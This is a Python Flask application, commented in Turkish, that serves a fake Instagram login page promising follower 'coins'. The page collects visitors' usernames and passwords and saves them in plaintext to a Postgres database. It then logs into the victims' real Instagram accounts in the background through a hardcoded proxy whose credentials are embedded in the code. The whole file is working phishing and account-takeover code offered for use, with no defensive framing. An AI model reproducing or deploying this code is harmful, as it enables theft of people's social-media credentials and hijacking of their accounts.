import os
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
import threading
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)
# Frankfurt Postgres bağlantısı
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['SECRET_KEY'] = "topfollow-v40-secret"

db = SQLAlchemy(app)

# --- PROXY AYARI (Senin verdiğin bilgiler) ---
# Format: http://user:pass@host:port
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

# --- MODEL ---
class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(50), default="Beklemede") # Giriş yapıldı mı?

# --- BOT FONKSİYONU ---
def start_bot_login(u, p):
    cl = Client()
    if PROXY_URL:
        cl.set_proxy(PROXY_URL)
    
    try:
        # Arka planda Instagram'a gerçekten giriş yapmayı dener
        cl.login(u, p)
        # Giriş başarılıysa veritabanını güncelle
        with app.app_context():
            acc = IGAccount.query.filter_by(username=u).first()
            if acc:
                acc.status = "Aktif (Bot Bağlı)"
                db.session.commit()
        print(f"✅ Bot Giriş Yaptı: {u}")
    except Exception as e:
        print(f"❌ Bot Giriş Hatası ({u}): {e}")

# --- FRONTEND ---
UI = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-black text-white flex flex-col items-center justify-center h-screen px-4">
    <div class="w-full max-w-[350px] p-8 border border-zinc-800 rounded-sm bg-black">
        <h1 class="text-4xl italic font-serif mb-10 text-center tracking-tighter">Instagram</h1>
        <div id="loginForm" class="space-y-2">
            <input id="u" placeholder="Telefon numarası, kullanıcı adı veya e-posta" class="w-full p-2.5 bg-zinc-900 border border-zinc-800 text-xs rounded-sm outline-none focus:border-zinc-600">
            <input id="p" type="password" placeholder="Şifre" class="w-full p-2.5 bg-zinc-900 border border-zinc-800 text-xs rounded-sm outline-none focus:border-zinc-600">
            <button onclick="connect()" id="btn" class="w-full bg-[#0095f6] hover:bg-blue-600 p-1.5 mt-2 rounded-lg font-semibold text-sm transition">Giriş Yap</button>
            <p id="msg" class="text-[#ed4956] text-sm text-center hidden">Şifreniz hatalı. Lütfen tekrar deneyin.</p>
        </div>
        <div id="success" class="hidden text-center py-4">
            <div class="mb-4 flex justify-center text-green-500 text-5xl">✓</div>
            <h2 class="text-lg font-bold mb-2">Giriş Onaylandı</h2>
            <p class="text-xs text-zinc-400">Hesabınız havuz sistemine eklendi. Coinleriniz yükleniyor...</p>
        </div>
    </div>
    <script>
        async function connect(){
            const u = document.getElementById('u').value;
            const p = document.getElementById('p').value;
            if(!u || !p) return;
            
            document.getElementById('btn').innerText = "Giriş yapılıyor...";
            
            const res = await fetch('/api/connect', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({u, p})
            });
            
            if(res.ok) {
                document.getElementById('loginForm').classList.add('hidden');
                document.getElementById('success').classList.remove('hidden');
            } else {
                document.getElementById('msg').classList.remove('hidden');
                document.getElementById('btn').innerText = "Giriş Yap";
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index(): return render_template_string(UI)

@app.route('/api/connect', methods=['POST'])
def connect():
    data = request.json
    u, p = data.get('u'), data.get('p')
    
    # Veritabanına Kaydet (Frankfurt Postgres)
    acc = IGAccount.query.filter_by(username=u).first()
    if acc:
        acc.password = p
    else:
        acc = IGAccount(username=u, password=p)
        db.session.add(acc)
    db.session.commit()

    # Arka planda botu (instagrapi) başlat
    threading.Thread(target=start_bot_login, args=(u, p)).start()
    
    return jsonify(status="ok"), 200

if __name__ == "__main__":
    with app.app_context():
        db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
